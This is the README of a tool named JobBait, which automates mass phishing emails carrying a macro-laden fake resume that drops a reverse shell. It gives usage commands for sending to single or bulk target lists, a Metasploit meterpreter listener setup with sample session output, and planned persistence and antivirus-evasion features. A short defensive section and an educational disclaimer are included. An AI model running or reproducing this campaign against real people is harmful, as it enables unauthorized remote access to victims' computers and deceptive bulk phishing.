# JobBait - Automated Phishing Mass Attack

**JobBait** is a project designed to demonstrate the mechanics of phishing attacks and remote access techniques. It automates the process of sending a **malicious Word document (`.docm`)** via email to multiple recipients. When the document is opened and macros are enabled, it establishes a **reverse shell** connection to the attacker's machine.

## 📌 How It Works

### 1️⃣ Automated Phishing Emails (`jobbait.py`)

* Sends a **fake job application email** with an attached  **malicious resume** .
* Supports sending to **a single target** or  **multiple targets from a file** .
* Uses **SMTP (Gmail, Outlook, or any mail server)** to deliver emails.

### 2️⃣ Malicious Word Macro (`.docm`)

* The embedded  **VBA macro executes when the document is opened** .
* The payload  **downloads and executes a reverse shell** .
* Execution relies on a **classical social engineering tactic**: convincing the user to enable macros.

### 3️⃣ Reverse Shell Execution (`Metasploit`)

* The attacker listens for incoming connections using the  **Metaspoit Framework** .
* When the victim enables macros, the payload  **executes and connects back** .
* The attacker gains  **remote control over the victim’s machine** .

## ⚠ **Important Note on Detection**

This macro  **will be detected by modern antivirus solutions and EDR (Endpoint Detection & Response)** . To successfully execute this attack in a real-world scenario,  **bypassing security mechanisms is required** , but that is  **out of the scope of this project** . The goal is to  **understand the attack chain, not to evade defenses** .

## 📂 Project Structure

```
📁 JobBait
├── 📜 README.md          # This file
├── 📜 jobbait.py         # Phishing automation script
├── 📜 Resume_John_DOE.docm  # Malicious Word document
├── 📜 targets.txt        # List of target emails (optional)
```

## 🛠 Installation & Usage

### 1️⃣ Configure Email Sender

Edit `jobbait.py` to use a test email account (do not use personal email accounts):

```python
EMAIL_SENDER = "yourburneremail@gmail.com"
EMAIL_PASSWORD = "your-email-password"
```

### 2️⃣ Run the Phishing Script

#### ✅ Send to a Single Target

```bash
python jobbait.py target@example.com
```

#### ✅ Send to Multiple Targets (from `targets.txt`)

```bash
python jobbait.py targets.txt
```

### 3️⃣ Start the Metasploit Listener

On  **Kali Linux** , run:

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.X.X  # Kali IP
set LPORT 4444
exploit -j
```

### 4️⃣ Victim Opens the Word File

Once the victim opens the `.docm` file and enables macros, a reverse shell is established:

```plaintext
[*] Meterpreter session 1 opened (192.168.X.X:4444 -> 192.168.X.Y:52000)
meterpreter >
```

## 🔥 Features

✅ **Automated email distribution** (single or bulk targets)
✅ **Realistic phishing email template**
✅ **Demonstrates a full attack chain**
✅ **Designed for educational purposes**

## 🛡 How to Defend Against This Attack

✔ **Disable Macros by Default** in Office settings.
✔ **Enable Email Filtering** to block `.docm` attachments.
✔ **Use Endpoint Detection & Response (EDR)** to catch suspicious macro execution.
✔ **Train Employees** on phishing awareness (verify senders before opening attachments).

## 🚨 Ethical & Legal Considerations

⚠ **This tool is for EDUCATIONAL & LEGAL penetration testing ONLY.**
⚠ **Unauthorized use is ILLEGAL** under cybercrime laws.
⚠ **Use this only in controlled environments or with explicit permission.**

## 🎓 Learning Outcomes

* Understanding  **payload obfuscation techniques** .
* Learning **how malicious macros execute** in Office documents.
* Setting up  **reverse shells with Metasploit** .

## 🎯 Future Improvements

* Add **persistence mechanisms** to maintain access even after a reboot.
* Use **fake job domains** for better social engineering effectiveness.
* Bypass **basic antivirus and email filtering** techniques by improving payload obfuscation.

## 🚀 Author & Contact

🔹 **Created by:** Anthony SILVA-RAYNAL
🔹 **LinkedIn:** [My personnal LinkedIn](https://www.linkedin.com/in/anthony-silva-raynal-11b108230/)
🔹 **GitHub:** [PhasmeHargneux](https://github.com/PhasmeHargneux/PhasmeHargneux/)

## 📜 Disclaimer

This project is intended for  **ethical cybersecurity research and penetration testing** . I **do not condone illegal activities** and am **not responsible for any misuse** of this tool.
